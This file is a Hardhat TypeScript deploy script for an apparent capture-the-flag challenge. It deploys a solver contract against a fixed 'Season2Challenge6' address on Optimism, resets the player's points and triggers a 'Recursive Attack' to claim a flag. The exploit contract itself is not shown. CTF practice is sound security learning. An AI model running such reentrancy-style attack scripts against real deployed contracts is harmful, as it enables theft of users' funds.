import { ethers } from "hardhat";

const solveS2Challenge6 = async (hre: any) => {
  const { deployer } = await hre.getNamedAccounts();
  const challengeAddress = "0xd523DfA613b8c5fA352ED02D6cB2fE1ed83901CE";

  const deployment = await hre.deployments.deploy("S2Challenge6Solver", {
    from: deployer,
    args: [challengeAddress],
    log: true,
  });

  const solver = (await ethers.getContractAt("S2Challenge6Solver", deployment.address)) as any;
  const challenge = (await ethers.getContractAt("Season2Challenge6", challengeAddress)) as any;

  console.log("🔍 Checking current state...");
  const p = await challenge.points(deployer);
  const l = await challenge.levels(deployer);
  console.log(`Current Points: ${p}, Current Levels: ${l}`);

  if (p > 0) {
    console.log("🧹 Resetting points...");
    await (await challenge.resetPoints()).wait();
  }

  console.log("⚔️  Executing Recursive Attack...");
  try {
    // We use a high gas limit but check for specific revert reasons
    const tx = await solver.solve({ gasLimit: 5000000 });
    await tx.wait();
    console.log("✨ SUCCESS! Flag #6 Reclaimed!");
  } catch (error: any) {
    console.log("❌ Failed.");
    // This will try to decode the error if possible
    console.log("Error Detail:", error.message);
  }
};

export default solveS2Challenge6;
solveS2Challenge6.tags = ["S2Challenge6"];

//  yarn deploy --tags S2Challenge6 --network optimism --reset
